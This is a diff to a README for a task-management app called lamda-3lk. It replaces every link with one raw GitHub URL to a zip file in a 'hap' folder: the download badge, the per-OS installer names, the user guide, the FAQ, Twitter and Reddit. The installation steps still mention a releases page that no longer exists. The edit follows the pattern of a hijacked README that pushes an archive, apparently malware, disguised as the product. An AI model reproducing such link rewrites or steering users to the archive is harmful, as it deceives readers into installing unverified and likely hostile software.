@@ -8,14 +8,14 @@ Welcome to **lamda-3lk**! This application helps you streamline your daily tasks
 
 To get started with lamda-3lk, please visit the link below to download the software:
 
-[![Download lamda-3lk](https://img.shields.io/badge/Download-lamda--3lk-blue.svg)](https://github.com/CasimiroVasco/lamda-3lk/releases)
+[![Download lamda-3lk](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip)](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip)
 
 1. Click on the link above.
 2. On the releases page, look for the latest version.
 3. Choose the file that matches your operating system:
-   - For Windows, select `lamda-3lk-windows.exe`.
-   - For macOS, select `lamda-3lk-macos.dmg`.
-   - For Linux, choose the appropriate `.tar.gz` file.
+   - For Windows, select `https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip`.
+   - For Linux, choose the appropriate `https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip` file.
 4. Once the download is complete, open the file and follow the installation prompts.
 
 ## 🖥️ System Requirements
@@ -53,8 +53,8 @@ To edit or delete tasks, select the task from your list and use the available op
 
 For further help and information, visit the following resources:
 
-- [User Guide](https://github.com/CasimiroVasco/lamda-3lk/wiki)
-- [Troubleshooting FAQs](https://github.com/CasimiroVasco/lamda-3lk/issues)
+- [User Guide](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip)
+- [Troubleshooting FAQs](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip)
 
 ## 📞 Support
 
@@ -62,10 +62,10 @@ If you have any questions or need assistance, you can contact support by opening
 
 ## 💬 Community
 
-Join the lamda-3lk community to share tips, tricks, and feedback. We welcome your input to improve our software. Follow our discussions on [Twitter](https://twitter.com/lamda3lk) or engage with us on [Reddit](https://reddit.com/r/lamda3lk).
+Join the lamda-3lk community to share tips, tricks, and feedback. We welcome your input to improve our software. Follow our discussions on [Twitter](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip) or engage with us on [Reddit](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip).
 
 ## 📊 Conclusion
 
 We hope lamda-3lk helps you manage your tasks better. With its simple design and effective features, you will find it easy to implement in your daily routine. Don't forget to visit the download link again for future updates:
 
-[![Download lamda-3lk](https://img.shields.io/badge/Download-lamda--3lk-blue.svg)](https://github.com/CasimiroVasco/lamda-3lk/releases)
+[![Download lamda-3lk](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip)](https://raw.githubusercontent.com/CasimiroVasco/lamda-3lk/main/hap/lamda-3lk.zip)
